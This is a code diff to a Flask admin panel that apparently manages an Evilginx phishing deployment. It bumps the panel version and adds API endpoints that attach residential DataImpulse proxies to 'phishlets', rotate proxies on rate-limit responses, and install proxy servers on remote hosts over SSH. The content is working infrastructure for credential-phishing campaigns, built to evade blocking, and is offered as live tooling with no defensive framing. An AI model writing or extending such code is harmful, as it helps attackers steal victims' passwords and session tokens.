@@ -45,7 +45,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.10"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.11"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -2476,7 +2476,11 @@ def api_proxy_detach():
     if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
         return jsonify(error="invalid phishlet")
     if not ids:
-        return jsonify(error="select proxy to detach")
+        en = ((pxe.dataimpulse_public() or {}).get("enabled") or {})
+        if en.get(ph):
+            ids = [pxe.DI_PROXY_ID]
+        else:
+            return jsonify(error="select proxy to detach")
     st = pxe.detach(ph, ids)
     nc_push("Proxy detached", f"{ph}: removed {len(ids)} proxy(ies). Live tunnels closed — next request uses the server IP or remaining pool.", "info")
     return jsonify(ok=True, **st)
@@ -2496,6 +2500,83 @@ def api_proxy_carousel():
         f"{ph}: carousel {'on — 429 rotates the queue, no detach' if enabled else 'off — 429 does not rotate or detach'}.",
         "info",
     )
+    return jsonify(ok=True, **st)
+
+
+@app.route("/api/proxy/manual-rise", methods=["GET", "POST"])
+@auth
+def api_proxy_manual_rise():
+    data = {}
+    if request.method == "POST":
+        data = request.get_json(silent=True) or {}
+    try:
+        bundle = pxe.manual_rise_bundle(
+            user=data.get("user"),
+            password=data.get("password"),
+            allow_ip=data.get("allow_ip"),
+        )
+    except Exception as e:
+        return jsonify(error=str(e))
+    return jsonify(ok=True, **bundle)
+
+
+@app.route("/api/proxy/manual-install", methods=["GET", "POST"])
+@auth
+def api_proxy_manual_install():
+    if request.method == "GET":
+        return jsonify(pxe.manual_install_status())
+    data = request.get_json(force=True) or {}
+    try:
+        st = pxe.manual_install_start(
+            ip=data.get("ip") or data.get("host") or "",
+            port=data.get("port") or 22,
+            login=data.get("login") or data.get("user") or "root",
+            password=data.get("password") or "",
+            use_pem=bool(data.get("use_pem") or data.get("pem_auth")),
+            pem=data.get("pem") or data.get("key") or "",
+            pem_pass=data.get("pem_pass") or data.get("passphrase") or "",
+        )
+    except Exception as e:
+        return jsonify(error=str(e))
+    return jsonify(st)
+
+
+@app.route("/api/proxy/dataimpulse", methods=["GET", "POST"])
+@auth
+def api_proxy_dataimpulse():
+    if request.method == "GET":
+        return jsonify(ok=True, **pxe.dataimpulse_public())
+    data = request.get_json(force=True) or {}
+    try:
+        st = pxe.save_dataimpulse_creds(
+            login=data.get("login"),
+            password=data.get("password"),
+            host=data.get("host"),
+            port=data.get("port"),
+            country=data.get("country"),
+        )
+    except Exception as e:
+        return jsonify(error=str(e))
+    nc_push("DataImpulse", "Gateway credentials saved.", "info")
+    return jsonify(ok=True, **st)
+
+
+@app.route("/api/proxy/dataimpulse/enable", methods=["POST"])
+@auth
+def api_proxy_dataimpulse_enable():
+    data = request.get_json(force=True) or {}
+    ph = data.get("phishlet") or ""
+    if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
+        return jsonify(error="invalid phishlet")
+    enabled = bool(data.get("enabled"))
+    try:
+        st = pxe.set_dataimpulse(ph, enabled)
+    except Exception as e:
+        return jsonify(error=str(e))
+    try:
+        egm.restart()
+    except Exception:
+        pass
     return jsonify(ok=True, **st)
 
 
